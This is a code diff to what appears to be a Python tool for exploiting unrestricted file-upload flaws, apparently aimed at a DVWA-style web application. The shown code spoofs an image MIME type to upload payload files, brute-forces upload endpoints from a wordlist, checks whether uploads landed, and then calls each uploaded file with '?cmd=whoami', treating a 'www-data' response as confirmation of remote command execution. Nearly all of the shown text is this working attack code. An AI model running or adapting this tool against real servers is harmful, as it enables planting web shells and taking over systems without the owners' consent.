@@ -68,8 +68,26 @@ def create_payloads():
 
     return created_files
 
+def upload_file(upload_url, payload_filename, cookie):
+    """
+    Attempt to upload a file to the given upload_url using an acceptable MIME type.
+    """
+    data = {'Upload': 'Upload', 'MAX_FILE_SIZE': '100000'}
+    mime_type = "image/png"  # Using a MIME type acceptable for image uploads
+    files = {'uploaded': (payload_filename, open(payload_filename, 'rb'), mime_type)}
+    try:
+        print(f"[*] Uploading {payload_filename} with MIME type: {mime_type} to {upload_url}...")
+        response = requests.post(upload_url, files=files, data=data, cookies=cookie)
+        if "successfully uploaded!" in response.text:
+            print("[+] File uploaded successfully!")
+            return True
+        else:
+            print(f"[-] Upload failed with MIME type: {mime_type}")
+    except Exception as e:
+        print(f"[-] Upload error: {str(e)}")
+    return False
 
-def upload_files(payload_filenames):
+def upload_files(payload_filenames, upload_url, local_upload_path, cookie):
     """Upload payloads and verify if they are uploaded successfully."""
     uploaded_files = []
     failed_files = []
@@ -80,50 +98,47 @@ def upload_files(payload_filenames):
         files = {'uploaded': (filename, open(filename, 'rb'), mime_type)}
 
         try:
-            print(f"[*] Uploading {filename} with MIME {mime_type}...")
-            response = requests.post(UPLOAD_URL, files=files, data=data, cookies=COOKIE)
-
+            print(f"[*] Uploading {filename} with MIME {mime_type} to {upload_url}...")
+            response = requests.post(upload_url, files=files, data=data, cookies=cookie)
             if "successfully uploaded!" in response.text:
                 print(f"[+] {filename} uploaded successfully (Response Confirmed)!")
                 uploaded_files.append(filename)
                 continue
-
-            # Check if file exists in the upload directory
             time.sleep(1)
-            upload_path = os.path.join(LOCAL_UPLOAD_PATH, filename)
-            if os.path.exists(upload_path):
-                print(f"[+] {filename} uploaded successfully (Found in directory)!")
-                uploaded_files.append(filename)
+            # Check if file exists locally, if a local path is provided
+            if local_upload_path:
+                upload_path = os.path.join(local_upload_path, filename)
+                if os.path.exists(upload_path):
+                    print(f"[+] {filename} uploaded successfully (Found in directory)!")
+                    uploaded_files.append(filename)
+                else:
+                    print(f"[-] Upload failed for {filename} (File not found in directory).")
+                    failed_files.append(filename)
             else:
-                print(f"[-] Upload failed for {filename} (File not found in directory).")
+                print(f"[-] Upload failed for {filename} (No local path provided).")
                 failed_files.append(filename)
-
         except Exception as e:
             print(f"[-] Upload error for {filename}: {str(e)}")
             failed_files.append(filename)
-
     return uploaded_files, failed_files
 
 
-def test_uploaded_files(uploaded_files):
+def test_uploaded_files(uploaded_files, upload_dir, cookie):
     """Check if uploaded files execute commands using ?cmd=whoami."""
     successful_executions = []
 
     for filename in uploaded_files:
-        test_url = f"{UPLOAD_DIR}{filename}?cmd=whoami"
+        test_url = f"{upload_dir}{filename}?cmd=whoami"
         try:
             print(f"[*] Testing execution: {test_url}")
-            response = requests.get(test_url, cookies=COOKIE)
-
+            response = requests.get(test_url, cookies=cookie)
             if "www-data" in response.text:
                 print(f"[+] Command execution successful for {filename}!")
                 successful_executions.append(filename)
             else:
                 print(f"[-] Command execution failed for {filename} (No www-data response).")
-
         except Exception as e:
             print(f"[-] Error testing {filename}: {str(e)}")
-
     return successful_executions
 
 def try_upload_url(base_url, wordlist_file, cookie, payload_filename):
@@ -134,11 +149,11 @@ def try_upload_url(base_url, wordlist_file, cookie, payload_filename):
     with open(wordlist_file, "r") as f:
         candidate_paths = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
     for path in candidate_paths:
-        upload_url = base_url + path
-        print(f"[*] Trying upload URL: {upload_url}")
-        if upload_file(upload_url, payload_filename, cookie):
-            print(f"[+] Upload succeeded with URL: {upload_url}")
-            return upload_url
+        upload_url_candidate = base_url + path
+        print(f"[*] Trying upload URL: {upload_url_candidate}")
+        if upload_file(upload_url_candidate, payload_filename, cookie):
+            print(f"[+] Upload succeeded with URL: {upload_url_candidate}")
+            return upload_url_candidate
     return None
 
 def get_upload_directory(base_url, wordlist_file):
